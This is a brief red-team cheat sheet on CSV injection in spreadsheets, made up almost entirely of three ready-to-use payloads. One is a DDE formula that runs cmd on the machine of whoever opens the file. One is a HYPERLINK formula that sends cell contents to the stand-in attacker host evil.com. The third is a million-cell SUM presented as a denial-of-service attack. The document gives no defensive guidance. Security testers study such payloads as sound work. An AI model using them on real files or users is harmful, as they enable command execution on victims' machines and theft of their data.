# Red Team: CSV Injection

---

## Attack 1: Formula Injection

**Payload:**
```csv
name,phone
Admin,"=cmd|' /C calc'!A0"
```

**Impact:** Opens calculator (proof of concept). Real attacks transfer data or install malware.

---

## Attack 2: Data Exfiltration

**Payload:**
```csv
name,data
Target,"=HYPERLINK(""http://evil.com/?d="" & A1 & """" & B1, ""click"")"
```

**Impact:** When opened in Excel, silently sends data to attacker.

---

## Attack 3: Denial of Service

**Payload:**
```csv
name,formula
User,"=SUM(A1:A1048576)"
```

**Impact:** Excel tries to sum 1 million cells. Hangs, crashes, or uses 100% CPU.
